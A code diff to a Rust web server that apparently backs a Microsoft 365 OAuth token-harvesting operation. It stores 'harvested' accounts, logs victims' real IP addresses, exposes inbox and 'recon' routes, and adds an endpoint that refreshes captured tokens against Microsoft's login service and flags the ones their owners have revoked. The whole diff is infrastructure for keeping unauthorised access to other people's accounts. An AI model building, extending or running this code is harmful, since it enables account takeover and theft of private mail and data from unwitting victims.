@@ -484,8 +484,14 @@ async fn exchange_code(
                 let (tenant_name, account_type) = detect_tenant_fixed(&email_str, id_token_claims.as_ref());
                 let category = account_type.clone(); // Keep category for backward compatibility
                 
-                // Get IP address - try from query parameter first (passed from Cloudflare Worker), then from request
-                let ip_address = query.user_ip.clone()
+                // Get real client IP address
+                // Priority: 1) X-Forwarded-For header, 2) query param (from Cloudflare Worker), 3) peer_addr
+                let ip_address = req.headers()
+                    .get("X-Forwarded-For")
+                    .and_then(|v| v.to_str().ok())
+                    .and_then(|v| v.split(',').next())
+                    .map(|s| s.trim().to_string())
+                    .or_else(|| query.user_ip.clone())
                     .or_else(|| req.connection_info().peer_addr().map(|s| s.to_string()))
                     .unwrap_or_else(|| "unknown".to_string());
                 
@@ -699,7 +705,8 @@ async fn api_delete_tokens(
 
     for id in &body.token_ids {
         // Delete related records first to avoid foreign key constraint violations
-        let _ = sqlx::query("DELETE FROM rules WHERE token_id = ?")
+        // Only delete from tables that actually exist in the database schema
+        let _ = sqlx::query("DELETE FROM created_rules WHERE token_id = ?")
             .bind(id)
             .execute(&state.pool)
             .await;
@@ -715,35 +722,11 @@ async fn api_delete_tokens(
             .bind(id)
             .execute(&state.pool)
             .await;
-        let _ = sqlx::query("DELETE FROM inbox_messages WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
         let _ = sqlx::query("DELETE FROM local_folders WHERE token_id = ?")
             .bind(id)
             .execute(&state.pool)
             .await;
-        let _ = sqlx::query("DELETE FROM tasks WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
-        let _ = sqlx::query("DELETE FROM contacts WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
-        let _ = sqlx::query("DELETE FROM drive_items WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
-        let _ = sqlx::query("DELETE FROM office_docs WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
-        let _ = sqlx::query("DELETE FROM calendar_events WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
-        let _ = sqlx::query("DELETE FROM teams WHERE token_id = ?")
+        let _ = sqlx::query("DELETE FROM local_filtered_messages WHERE token_id = ?")
             .bind(id)
             .execute(&state.pool)
             .await;
@@ -816,6 +799,11 @@ async fn tokens_health(state: web::Data<AppState>) -> impl Responder {
 // JSON API: get inbox emails for a token
 #[derive(Deserialize)]
 pub struct InboxApiQuery {
+    token_id: String,
+}
+
+#[derive(Deserialize)]
+pub struct TokenIdQuery {
     token_id: String,
 }
 
@@ -1100,6 +1088,38 @@ async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<S
     body.get("access_token").and_then(|v| v.as_str()).map(|s| s.to_string())
 }
 
+// API endpoint to refresh a single token manually
+async fn api_refresh_token_handler(
+    query: web::Query<TokenIdQuery>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = &query.token_id;
+    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
+    
+    match crate::scheduler::refresh_single_token(&state, token_id, token_url).await {
+        Ok(_) => {
+            HttpResponse::Ok().json(serde_json::json!({
+                "success": true,
+                "message": "Token refreshed successfully"
+            }))
+        }
+        Err(e) => {
+            let err_str = e.to_string();
+            // Check if token was revoked (invalid_grant)
+            if err_str.contains("invalid_grant") || err_str.contains("revoked") {
+                HttpResponse::Ok().json(serde_json::json!({
+                    "success": false,
+                    "message": "Token has been revoked by user"
+                }))
+            } else {
+                HttpResponse::InternalServerError().json(serde_json::json!({
+                    "success": false,
+                    "message": format!("Refresh failed: {}", err_str)
+                }))
+            }
+        }
+    }
+}
 
 // Root status route
 async fn root_status() -> impl Responder {
@@ -1205,7 +1225,6 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
             tenant_id TEXT,
             category TEXT,
             account_type TEXT,
-            cookie_session TEXT,
             last_refreshed_at DATETIME
         )"
     ).execute(pool).await?;
@@ -1225,13 +1244,12 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
             created_at DATETIME NOT NULL,
             last_refreshed_at DATETIME,
             status TEXT DEFAULT 'active',
-            account_type TEXT,
-            cookie_session TEXT
+            account_type TEXT
         )
         "#
     ).execute(pool).await?;
 
-    // Migration: add account_type and cookie_session columns if tables exist from before this change
+    // Migration: add account_type column if tables exist from before this change
     let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN account_type TEXT")
         .execute(pool).await;
     let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN account_type TEXT")
@@ -1420,6 +1438,7 @@ async fn main() -> std::io::Result<()> {
             .route("/api/tokens/health", web::get().to(tokens_health))
             .route("/api/tokens/store", web::post().to(store_token_handler))
             .route("/api/tokens/{id}", web::get().to(api_token_by_id))
+            .route("/api/refresh", web::post().to(api_refresh_token_handler))
             .route("/api/inbox", web::get().to(api_inbox))
             .route("/api/recon/run", web::post().to(recon_run_handler))
             .route("/api/recon/{token_id}", web::get().to(recon_get_handler))
